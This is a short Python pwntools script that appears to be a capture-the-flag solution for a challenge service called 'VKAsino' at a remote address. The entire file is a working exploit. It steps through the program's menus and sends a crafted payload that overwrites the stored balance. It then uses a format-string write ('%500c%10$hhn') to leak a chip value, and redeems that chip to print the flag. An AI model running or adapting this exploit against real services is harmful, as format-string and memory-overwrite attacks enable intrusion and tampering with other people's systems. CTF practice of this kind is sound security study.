#!/usr/bin/env python3

from pwn import *

# p = process("./VKAsino")
HOST = "212.193.61.73"
PORT = 1339
r = remote(HOST, PORT)

r.sendlineafter(b'$$$ ', b'2')
r.sendlineafter(b'$$$ ', b'3')

pl = b'13337' + b'\x00'*3 + p64(1) #make balace 13337
r.sendlineafter(b'Enter a balance to encrypt:', pl)
r.sendlineafter(b'$$$ ', b'4')
r.sendlineafter(b'$$$ ', b'1')
r.sendlineafter(b'$$$ ', b'1')
r.sendlineafter(b'How many times will you spin the machine? ', b'1')
r.sendlineafter(b'Whisper something to Jin for good luck: ', b'%500c%10$hhn')
r.recvuntil(b'[what_is_it]: ')
chip = r.recvline()
r.warn("chip: " + chip.decode())

r.sendlineafter(b'Choose an option: ', b'2')
r.sendlineafter(b'$$$ ', b'4')
r.sendlineafter(b'$$$ ', b'2')
r.sendlineafter(b'$$$ ', b'1')
r.sendlineafter(b'Give me your chips', chip)
r.recvuntil(b'[WIN]: ')
flag = r.recvline()
r.warn("flag: " + flag.decode())

# p.interactive()
